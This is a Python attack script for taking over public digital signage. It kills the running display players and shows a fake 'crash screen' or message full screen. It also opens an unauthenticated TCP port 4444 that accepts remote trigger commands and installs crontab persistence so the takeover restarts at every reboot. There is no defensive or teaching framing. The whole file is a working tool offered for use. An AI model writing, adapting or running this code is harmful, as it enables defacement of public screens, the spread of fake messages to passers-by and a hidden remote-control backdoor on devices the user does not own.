import os
import time
import argparse
import subprocess
import socket
import threading
from datetime import datetime

LOG = "results/screen_overwrite.log"
DEFAULT_IMAGE = "payloads/crash_screen.png"
REMOTE_PORT = 4444
LOOP_MODE = False

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{datetime.utcnow().isoformat()} | {msg}\n")

def detect_display():
    return os.environ.get("DISPLAY", ":0")

def kill_signage():
    targets = ["chromium", "firefox", "omxplayer", "feh"]
    for proc in targets:
        subprocess.call(f"pkill -f {proc}", shell=True)

def display_image(image, loop=False):
    kill_signage()
    cmd = ["feh", "--fullscreen", "--hide-pointer", image]
    if loop:
        cmd = ["while", "true;", "do"] + cmd + [";", "sleep", "5;", "done"]
        subprocess.Popen(" ".join(cmd), shell=True)
    else:
        subprocess.Popen(cmd)
    log(f"Displayed image: {image} (loop: {loop})")

def render_to_fb(image):
    try:
        subprocess.run(["fbi", "-T", "1", "-a", image], check=True)
        log(f"Displayed image to framebuffer: {image}")
    except Exception as e:
        log(f"[FB] Framebuffer render failed: {e}")

def serve_remote_trigger(image):
    def handler(client):
        cmd = client.recv(1024).decode().strip().lower()
        if cmd == "display":
            display_image(image)
        elif cmd == "fb":
            render_to_fb(image)
        elif cmd == "loop":
            display_image(image, loop=True)
        elif cmd == "stop":
            subprocess.call("pkill -f feh", shell=True)
        log(f"Remote trigger: {cmd}")
        client.close()

    s = socket.socket()
    s.bind(("0.0.0.0", REMOTE_PORT))
    s.listen(1)
    log(f"Listening for remote trigger on port {REMOTE_PORT}")
    while True:
        client, _ = s.accept()
        threading.Thread(target=handler, args=(client,), daemon=True).start()

def install_persistence(script_path):
    crontab = f"@reboot python3 {script_path} --image {DEFAULT_IMAGE} --loop\n"
    subprocess.call(f'(crontab -l; echo "{crontab}") | crontab -', shell=True)
    log("Persistence installed via crontab.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Overwrite public screen with fake image or message")
    parser.add_argument("--image", default=DEFAULT_IMAGE, help="Image to render")
    parser.add_argument("--fb", action="store_true", help="Use framebuffer (non-X display)")
    parser.add_argument("--remote", action="store_true", help="Enable remote trigger on TCP port 4444")
    parser.add_argument("--loop", action="store_true", help="Loop image infinitely")
    parser.add_argument("--persist", action="store_true", help="Install persistent overwrite via crontab")
    args = parser.parse_args()

    if args.persist:
        install_persistence(os.path.abspath(__file__))

    if args.remote:
        threading.Thread(target=serve_remote_trigger, args=(args.image,), daemon=True).start()

    if args.fb:
        render_to_fb(args.image)
    else:
        display_image(args.image, loop=args.loop)

    while args.remote:
        time.sleep(10)
